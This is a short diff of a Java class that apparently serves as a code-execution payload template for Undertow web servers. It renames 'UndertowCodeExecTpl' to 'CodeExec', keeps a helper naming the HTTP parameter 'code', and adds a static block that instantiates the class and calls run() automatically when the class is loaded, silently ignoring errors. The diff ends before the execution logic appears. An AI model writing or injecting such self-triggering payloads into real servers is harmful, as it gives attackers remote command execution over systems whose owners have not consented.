@@ -6,16 +6,22 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 
-public class UndertowCodeExecTpl {
+public class CodeExec
+{
 
     private static String getReqParamName() {
         return "code";
     }
 
-    public UndertowCodeExecTpl() {
+    public CodeExec() {
         run();
     }
-
+    static {
+        try {
+            new CodeExec();
+        } catch (Exception e) {
+        }
+    }
     private void run() {
         try {
             Thread thread = Thread.currentThread();
